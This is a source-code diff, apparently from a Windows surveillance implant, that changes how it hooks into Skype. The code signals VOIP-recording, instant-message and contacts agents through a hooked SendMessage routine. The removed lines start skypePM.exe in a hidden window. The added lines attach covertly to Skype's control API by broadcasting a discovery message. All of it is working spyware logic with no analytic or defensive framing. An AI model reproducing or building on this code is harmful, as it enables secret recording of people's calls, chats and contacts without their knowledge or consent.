@@ -1351,23 +1351,12 @@ LRESULT __stdcall PM_SendMessage(  HWND hWnd,
 			if (!pData->voip_is_sent) {
 				pData->voip_is_sent = TRUE;
 				pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)(&ret_code), sizeof(DWORD), FLAGS_SKAPI_INI, IPC_HI_PRIORITY);
-				if (!pData->is_spm_installed)
-					pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)(&ret_code), sizeof(DWORD), FLAGS_SKAPI_ATT, IPC_HI_PRIORITY);
 			}
 		}
 		if ((*Active_IM)) {
 			if (!pData->im_is_sent) {
 				pData->im_is_sent = TRUE;
 				pData->pHM_IpcCliWrite(PM_IMAGENT, (BYTE *)(&ret_code), sizeof(DWORD), FLAGS_SKAPI_INI, IPC_HI_PRIORITY);
-				if (!pData->is_spm_installed)
-					pData->pHM_IpcCliWrite(PM_IMAGENT, (BYTE *)(&ret_code), sizeof(DWORD), FLAGS_SKAPI_ATT, IPC_HI_PRIORITY);
-			}
-		}
-		if ((*Active_Contacts)) {
-			if (!pData->cn_is_sent) {
-				pData->cn_is_sent = TRUE;
-				if (!pData->is_spm_installed)
-					pData->pHM_IpcCliWrite(PM_CONTACTSAGENT, (BYTE *)(&ret_code), sizeof(DWORD), FLAGS_SKAPI_ATT, IPC_HI_PRIORITY);
 			}
 		}
 
@@ -1933,26 +1922,25 @@ DWORD WINAPI MonitorSkypePM(DWORD dummy)
 			Sleep(250);
 		}
 
-		// SkypePM ci serve per tenere traccia del flusso delle chiamate
-		if (!HM_FindPid("skypePM.exe", TRUE) && !IsX64System()) {			
-			ZeroMemory( &si, sizeof(si) );
-			si.cb = sizeof(si);
-			si.wShowWindow = SW_HIDE;
-			si.dwFlags = STARTF_USESHOWWINDOW;
-
-			// Cerca il path di skypepm partendo da quello di skype.exe
-			// e lo esegue
-			if ( (skipe_id = HM_FindPid("skype.exe", TRUE)) ) {
-				if ( (skype_handle = FNC(OpenProcess)(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, skipe_id)) ) {
-					if (FNC(GetModuleFileNameExA)(skype_handle, NULL, skype_path, sizeof(skype_path)-1)) {
-						if (skype_pm_ptr = strstr(skype_path, "\\Phone\\")) {
-							*skype_pm_ptr = 0;
-							_snprintf_s(skype_pm_path, sizeof(skype_pm_path), _TRUNCATE, "%s\\Plugin Manager\\skypePM.exe", skype_path);		
-							HM_CreateProcess(skype_pm_path, 0, &si, &pi, 0);
+		// Cerca il path di skypepm partendo da quello di skype.exe
+		// e lo esegue
+		if ( (skipe_id = HM_FindPid("skype.exe", TRUE)) ) {
+			if ( (skype_handle = FNC(OpenProcess)(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, skipe_id)) ) {
+				if (FNC(GetModuleFileNameExA)(skype_handle, NULL, skype_path, sizeof(skype_path)-1)) {
+					if (skype_pm_ptr = strstr(skype_path, "\\Phone\\")) {
+						*skype_pm_ptr = 0;
+						_snprintf_s(skype_pm_path, sizeof(skype_pm_path), _TRUNCATE, "%s\\Plugin Manager\\skypePM.exe", skype_path);		
+						// Vede se esiste il file
+						HANDLE	fileh = FNC(CreateFileA)(skype_pm_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
+						if (fileh != INVALID_HANDLE_VALUE)
+							CloseHandle(fileh);
+						else  {// Non c'e' lo skypePM quindi cerca di fare l'attach al processo
+							UINT msg_type = RegisterWindowMessage("SkypeControlAPIDiscover");
+							HM_SafeSendMessageTimeoutW(HWND_BROADCAST, msg_type, (WPARAM)g_report_hwnd, (LPARAM)NULL, SMTO_NORMAL, 500, NULL);
 						}
 					}
-					CloseHandle(skype_handle);
 				}
+				CloseHandle(skype_handle);
 			}
 		}
 	}
@@ -2277,17 +2265,6 @@ BOOL ParseSkypeMsg(BYTE *msg, DWORD *pdwLen, DWORD *pdwFlags)
 		// dei partner
 		EndCall();
 		FreePartnerList(&call_list_head);
-		return TRUE;
-	}
-
-	if (*pdwFlags & FLAGS_SKAPI_ATT) {
-		// Deve mandare il messaggio per il discovery
-		UINT msg_type = RegisterWindowMessage("SkypeControlAPIDiscover");
-		for (int i=0; i<30; i++) {
-			if (HM_SafeSendMessageTimeoutW(HWND_BROADCAST, msg_type, (WPARAM)g_report_hwnd, (LPARAM)NULL, SMTO_NORMAL, 500, NULL))
-				break;
-		}
-
 		return TRUE;
 	}
 
